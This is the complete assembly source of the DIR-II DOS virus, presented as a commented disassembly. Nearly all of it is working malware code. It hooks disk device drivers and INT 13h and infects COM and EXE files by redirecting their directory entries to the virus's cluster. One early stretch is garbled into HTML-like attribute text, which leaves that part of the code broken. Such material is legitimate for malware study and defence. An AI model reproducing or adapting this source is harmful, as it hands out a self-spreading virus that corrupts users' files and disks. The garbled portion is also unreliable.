

;  Disassembled virus : DIR-II
;  Target assembler   : TASM v1.0/2.0
;  Author             : Sajid Rahim
;  Organisation       : Systems Research Laboratories.
;  (c) Sajid Rahim
;        name    dir-ii_asm
;
;
dir_II segment byte public

SP_TOP          EQU     600h

        assume  cs:dir_II,ds:dir_II
	org	100h
adr_100:
        mov     sp,SP_TOP
        inc     word ptr inf_cnt
	xor	cx,cx
	mov	ds,cx
        lds     ax,dword ptr ds:[00C1h]
        add     ax,21h
	push	ds
        push    ax                      ;addr of 21h entry point + few instr.
        mov     ah,30h
        call    old_int21
        cmp     al,4                    ;version
        sbb     si,si                   ;si=0 for ver 4,5; FFFF for <4 mov="" byte="" ptr="" ds:[unit],0ffh="" ;ds="" cs="" !!="" mov="" bx,0060h="" ;vir="400," stack="200" mov="" ah,4ah="" call="" old_int21="" ;shrink/expand="" memblock="" to="" vir+stack="" mov="" ah,52h="" call="" old_int21="" ;list="" of="" lists="" push="" word="" ptr="" es:[bx-2]="" ;seg="" of="" root="" mcb="" lds="" bx,dword="" ptr="" es:[bx]="" ;address="" of="" first="" dpb="ds:bx" nextdpb:="" mov="" ax,word="" ptr="" [bx+si+15h]="" ;dpb+14="" (dos3),="" dpb+15="" (4,5)="" ;get="" seg="" of="" device="" header="" cmp="" ax,0070h="" jne="" not_70="" xchg="" ax,cx="" ;cx="70h" mov="" byte="" ptr="" [bx+si+18h],0ffh="" ;access="" flag,="" ff-not="" accessed="" mov="" di,word="" ptr="" [bx+si+13h]="" ;get="" offset="" of="" device="" header="" mov="" word="" ptr="" [bx+si+13h],offset="" newheader="" ;set="" offset="" of="" device="" header="" mov="" word="" ptr="" [bx+si+15h],cs="" ;set="" seg="" of="" device="" header="" not_70:="" lds="" bx,dword="" ptr="" [bx+si+19h]="" ;get="" addr="" of="" next="" dpb="" cmp="" bx,-1="" ;last="" jne="" nextdpb="" jcxz="" on_int20="" pop="" ds="" ;seg="" of="" root="" mcb="" mov="" ax,ds="" add="" ax,word="" ptr="" ds:[0003h]="" ;memblock="" size="" inc="" ax="" mov="" dx,cs="" dec="" dx="" cmp="" ax,dx="" jne="" not_vir_memblock="" add="" word="" ptr="" ds:[0003h],61h="" ;virus="" memblock="" size="" not_vir_memblock:="" mov="" ds,dx="" mov="" word="" ptr="" ds:[0001h],0008h="" ;owner="DOS" mov="" ds,cx="" les="" ax,dword="" ptr="" [di+6]="" ;ds="70h" mov="" word="" ptr="" cs:offs,ax="" ;ofs(strategy)="" (seg="70h)" mov="" word="" ptr="" cs:offi,es="" ;ofs(interrupt)="" (seg="70h)" cld="" mov="" si,1="" no_call:="" dec="" si="" lodsw="" cmp="" ax,1effh="" ;opcode="" of="" "call="" far="" [..]"="" jne="" no_call="" mov="" ax,02cah="" ;retf="" 2="" cmp="" word="" ptr="" [si+4],ax="" je="" farcall="" ;searches="" for="" construction:="" cmp="" word="" ptr="" [si+5],ax="" ;="" call="" far="" [..]="" jne="" no_call="" ;="" (2="" bytes="" or="" 3="" bytes)="" farcall:="" ;="" retf="" 2="" lodsw="" ;fetch="" ptr="" of="" farcall="" dword="" push="" cs="" pop="" es="" mov="" di,offset="" ptr_on_dword="" stosw="" xchg="" ax,si="" mov="" di,sp_top-8="" cli="" movsw="" ;copy="" dword="" addr="" of="" far="" call="" movsw="" mov="" dx,0c000h="" ;starting="" rom="" extension="" segment="" rom_scan:="" mov="" ds,dx="" xor="" si,si="" lodsw="" cmp="" ax,0aa55h="" ;rom="" sign="" jne="" not_rom="" cbw="" ;="xor" ah,ah="" lodsb="" ;size="" in="" 512="" pages="" mov="" cl,9="" shl="" ax,cl="" ;pages="" -=""> bytes
search_intercept:
        cmp     word ptr [si],06C7h     ;mov word ptr [004c]
        jne     chk_ROM_limit
        cmp     word ptr [si+2],4Ch     ;[004c] = offset of int 13!
        jne     chk_ROM_limit
        push    dx                      ;addr of int 13 (seg)
        push    word ptr [si+4]         ;addr of int 13 (ofs)
        jmp     short free_env
on_int20:
	int	020h

buf:
        db      063h,03Ah,0ffh,0

chk_ROM_limit:
	inc	si
        cmp     si,ax           ;ax=sizeof(ROM)
        jb      search_intercept
not_ROM:
        inc     dx
        cmp     dh,0F0h         ;end of ROM scan ?
        jb      ROM_scan
        sub     sp,4            ;put 2 words on stack (as dx & word [si+4])
free_env:
	push	cs
	pop	ds
        mov     bx,word ptr ds:[002Ch]          ;seg of environment
	mov	es,bx
        mov     ah,49h                          ;free memblock
        call    old_int21
	xor	ax,ax
	test	bx,bx
        je      no_envseg
;scan environment to find exec name (after two zero bytes!) = ASCIIZ
        mov     di,1
scan_env:
	dec	di
	scasw	
        jne     scan_env
        lea     si,word ptr [di+2]              ;-> executed filename
        jmp     short si_name
no_envseg:
        mov     es,word ptr ds:[0016h]          ;DOS reserved area in PSP
        mov     bx,word ptr es:[0016h]
	dec	bx
        xor     si,si                           ;-> executed filename
si_name:
	push	bx
        mov     bx,OFFSET EPB           ;es:bx->EXEC parm block for DOS Exec
        mov     word ptr [bx+4],cs
        mov     word ptr [bx+8],cs
        mov     word ptr [bx+0Ch],cs
	pop	ds
	push	cs
	pop	es
        mov     di,OFFSET Bottom+22h
	push	di
        mov     cx,28h                  ;=80 bytes decimal
rep	movsw	
	push	cs
	pop	ds
        mov     ah,3Dh                  ;open
        mov     dx,OFFSET buf
        call    old_int21
        pop     dx                      ;OFFSET Bottom+22h (=522h)
        mov     ax,4B00h                ;execute
        call    old_int21
        mov     ah,4Dh                  ;wait (get ERRORLEVEL)
        call    old_int21
        mov     ah,4Ch                  ;terminate
old_int21:
	pushf	
        call    dword ptr cs:[SP_TOP-4]
        ret

int13_write:                    ;244h
        mov     ah,3                    ;int 13 write ?
        jmp     dword ptr cs:[SP_TOP-8]

Device_driver:                  ;24bh
	push	ax
	push	cx
	push	dx
	push	ds
	push	si
	push	di

	push	es
	pop	ds

        mov     al,byte ptr [bx+2]              ;function #
        cmp     al,4            ;read
        je      do_read
        cmp     al,8            ;write
        je      do_write
        cmp     al,9            ;write+verify
        je      do_write
        call    old_dev_drv
        cmp     al,2
        jne     pops_retf
;here if build BPB function
        lds     si,dword ptr [bx+12h]           ;addr of BPB for block device
        mov     di,OFFSET Bottom+2              ;0502h
        mov     word ptr es:[bx+12h],di         ;own BPB
        mov     word ptr es:[bx+14h],cs
	push	es
	push	cs
	pop	es
        mov     cx,10h
rep     movsw                                   ;copy BPB to 502
	pop	es
	push	cs
	pop	ds
        mov     al,byte ptr [di-1Eh]            ;sectors/cluster
        cmp     al,2
        adc     al,0    ;set al=2 if al=1 (0 impossible)
	cbw	
        cmp     word ptr [di-18h],0             ;total sectors/media
        je      dword_at_15                     ;=0 => dword at offset 15
        sub     word ptr [di-18h],ax            ;reduce media size
        jmp     short pops_retf
dword_at_15:
        sub     word ptr [di-0Bh],ax            ;reduce dword = (sect/media)
        sbb     word ptr [di-9],0
pops_retf:
	pop	di
	pop	si
	pop	ds
	pop	dx
	pop	cx
	pop	ax
_retf:
        retf

do_write:
	mov	cx,0FF09h
        call    unit_chk                ;not uses cx
        je      an_write
        call    old_dev_drv
        jmp     short common

an_write:
        jmp     from_write

an_read:
        jmp     from_read

go_out:
        add     sp,10h
        jmp     short pops_retf

do_read:
        call    unit_chk
        je      an_read
common:
        mov     byte ptr [bx+2],4       ;input
	cld	
        lea     si,word ptr [bx+0Eh]    ;DTA addr
        mov     cx,8
lodsw_push:
	lodsw	
	push	ax
        loop    lodsw_push

        mov     word ptr [bx+14h],1     ;starting sector
        call    old_1sec
        jnz     go_out
        mov     byte ptr [bx+2],2       ;build BPB
        call    old_dev_drv
        lds     si,dword ptr [bx+12h]   ;returned address of BPB
        mov     ax,word ptr [si+6]      ;max number of dir entries in root
        add     ax,000Fh
        mov     cl,4
	shr	ax,cl
        mov     di,word ptr [si+0Bh]    ;# of sectors in one FAT
        add     di,di                   ;in two FATs
	stc	
	adc	di,ax
	push	di
	cwd	
        mov     ax,word ptr [si+8]      ;total sectors in media (if 0->at 15)
	test	ax,ax
        jnz     media_le_32M
        mov     ax,word ptr [si+15h]    ;DOS 4.0 extension for >32M
        mov     dx,word ptr [si+17h]
media_le_32M:
	xor	cx,cx
	sub	ax,di
	sbb	dx,cx
        mov     cl,byte ptr [si+2]      ;sectors/cluster
	div	cx
        cmp     cl,2
	sbb	ax,0FFFFh
	push	ax
        call    Xscramble
        mov     byte ptr es:[bx+2],4    ;read
        mov     word ptr es:[bx+14h],ax ;starting sector number
        call    old_1sec
scan_FAT:
        lds     si,dword ptr es:[bx+0Eh]        ;addr of DTA
	add	si,dx
	sub	dh,cl
	adc	dx,ax
        mov     word ptr cs:Xmask,dx
        cmp     cl,1
        je      cl_is_1
	mov	ax,word ptr [si]
	and	ax,di
        cmp     ax,0FFF7h               ;bad cluster in FAT
        je      bad
        cmp     ax,00FF7h               ;---"---
        je      bad
        cmp     ax,0FF70h               ;---"---
        jne     not_bad
bad:
	pop	ax
	dec	ax
	push	ax
        call    Xscramble
        jmp     short scan_FAT
cl_is_1:
	not	di
	and	word ptr [si],di
	pop	ax
	push	ax
	inc	ax
	push	ax
        mov     dx,000Fh
	test	dx,di
        je      low_nibble
	inc	dx
	mul	dx
low_nibble:
	or	word ptr [si],ax
	pop	ax
        call    Xscramble
        mov     si,word ptr es:[bx+0Eh]         ;offset of DTA, ds=OK
	add	si,dx
	mov	ax,word ptr [si]
	and	ax,di
not_bad:
	mov	dx,di
	dec	dx
	and	dx,di
	not	di
	and	word ptr [si],di
	or	word ptr [si],dx
	cmp	ax,dx
	pop	ax
	pop	di
        mov     word ptr cs:Vclust,ax           ;put Vcluster to write in dir
        je      skip
	mov	dx,word ptr [si]
	push	ds
	push	si
        call    virtual
	pop	si
	pop	ds
        jne     skip
        call    old_1sec
	cmp	word ptr [si],dx
        jne     skip
	dec	ax
	dec	ax
	mul	cx
	add	ax,di
        adc     dx,0
	push	es
	pop	ds
        mov     word ptr [bx+12h],2             ;sector count
        mov     word ptr [bx+14h],ax            ;starting sector
	test	dx,dx
        je      less_32M
        mov     word ptr [bx+14h],0FFFFh        ;sign >32M => use dword at 1Ah
        mov     word ptr [bx+1Ah],ax            ;low word
        mov     word ptr [bx+1Ch],dx            ;hi word
less_32M:
        mov     word ptr [bx+10h],cs            ;addr of DTA (seg)
        mov     word ptr [bx+0Eh],100h          ;            (ofs)
        call    virtual
skip:
	std	
        lea     di,word ptr [bx+1Ch]            ;ptr -> hiword of size (>32M)
        mov     cx,8
pop_stosw:
	pop	ax
	stosw	
        loop    pop_stosw

from_read:
        call    old_dev_drv
        mov     cx,9
from_write:
        mov     di,word ptr es:[bx+12h]         ;sector count
        lds     si,dword ptr es:[bx+0Eh]        ;addr of DTA
	shl	di,cl
	xor	cl,cl
        add     di,si                   ;size to examine
        xor     dl,dl                   ;set zero dl (infect dir entry)
        push    ds                      ;save DTA
	push	si
        call    next_dir_entry
        jcxz    cx_0
        call    virtual
        and     byte ptr es:[bx+4],07Fh         ;clear error bit
cx_0:
        pop     si                      ;restore DTA
	pop	ds
        inc     dx                      ;set nonzero dl (uninfect dir entry)
        call    next_dir_entry
        jmp     pops_retf

next_dir_entry:
        mov     ax,word ptr [si+8]
        cmp     ax,05845h               ;XE
        jne     not_EX
        cmp     byte ptr [si+0Ah],al    ;E
        je      is_EXE
not_EX:
        cmp     ax,04F43h               ;OC
        jne     on_exit
        cmp     byte ptr [si+0Ah],4Dh   ;M
        jne     on_exit
is_EXE:
        test    word ptr [si+1Eh],0FFC0h        ;file size (hi)
        jne     on_exit
        test    word ptr [si+1Dh],3FF8h         ;file size (middle word!)
        je      on_exit
        test    byte ptr [si+0Bh],1Ch           ;attribute
        jne     on_exit
        test    dl,dl
        jnz     uninfect
        db      0b8h            ;mov ax,...
Vclust  dw      0163h
        cmp     ax,word ptr [si+1Ah]            ;cluster #
        je      on_exit                         ;already set on virus
        xchg    ax,word ptr [si+1Ah]            ;cluster #
        db      35h                     ;xor ax,...
Xmask   LABEL   word
        db      17h                     ;XOR original cluster number
Xlow    db      0FEh                    ;XOR original cluster number
        mov     word ptr [si+14h],ax            ;put in reserved space
        loop    on_exit                 ;=jmp
uninfect:
	xor	ax,ax
        xchg    ax,word ptr [si+14h]            ;XORed original cluster
        xor     ax,word ptr cs:Xmask
        mov     word ptr [si+1Ah],ax            ;cluster
on_exit:
        rol     word ptr cs:Xmask,1
        add     si,20h                          ;next dir entry
	cmp	di,si
        jne     next_dir_entry
	ret	

unit_chk:                               ;ds=es
        mov     ah,byte ptr [bx+1]      ;unit (block device) number
        db      80h,0fch                ;cmp ah,...
unit    db      0
        mov     byte ptr cs:[unit],ah
        jne     on_ret                  ;different unit
        push    word ptr [bx+0Eh]       ;save offset of DTA
        mov     byte ptr [bx+2],1       ;command code (1=media change check)
        call    old_dev_drv
        cmp     byte ptr [bx+0Eh],1
        pop     word ptr [bx+0Eh]       ;restore offset of DTA
        mov     byte ptr [bx+2],al      ;restore command code
on_ret:
        ret

virtual:
        cmp     byte ptr es:[bx+2],8    ;write
        ja      old_dev_drv
        mov     byte ptr es:[bx+2],4    ;read
        mov     si,0070h
	mov	ds,si
        db      0beh            ;mov si,...
ptr_on_dword    dw      00B4h
	push	word ptr [si]
        push    word ptr [si+2]
        mov     word ptr [si],OFFSET int13_write
        mov     word ptr [si+2],cs
        call    old_dev_drv
        pop     word ptr [si+2]
	pop	word ptr [si]
	ret	

old_1sec:
        mov     word ptr es:[bx+12h],1          ;1 sector
old_dev_drv:
        db      9ah                             ;call strategy
offs    dw      0
        dw      70h
        db      9ah                             ;call interrupt
offi    dw      0
        dw      70h
        test    byte ptr es:[bx+4],80h          ;error ?
	ret	

Xscramble:
        cmp     ax,0FF0h
        ja      gt_ff0
        mov     si,3
        xor     word ptr cs:[si+(OFFSET Xlow-3)],si     ;ofs(Xlow)-3=43dh
	mul	si
	shr	ax,1
        mov     di,0FFFh
        jnc     no_CY
	mov	di,0FFF0h
        jmp     short no_CY
gt_ff0:
        mov     si,2
	mul	si
	mov	di,0FFFFh
no_CY:
        mov     si,200h
	div	si
        inc     ax
	ret	

inf_cnt dw      0022h   ;4eb

newheader       =       $-4             ;4e9 -> inc ax, ret
        dw      0842h                   ;attribute (block,>32M,
                                        ;support logicaldevices,
                                        ;support open/close/RM) at 4ed
        dw      OFFSET Device_driver    ;024Bh at 4ef   strategy
        dw      OFFSET _retf            ;02A2h at 4f1   interrupt
        db      7Fh                     ;subunit # for block devices at 4f3
EPB:
        dw      0000h   ;4f4 - segment of environment for child
        dw      0080h
        dw      1027h   ;cs - command line
        dw      005Ch
        dw      1027h   ;cs - 1st FCB
        dw      006Ch
;       dw      0006h   ;cs - 2nd FCB
Bottom:
;+0
;+2     BPB start               ;copies original BPB here
;...
;+21h   BPB end
;+22h   ASCIIZ to start

dir_II  ends
        end     adr_100

</4>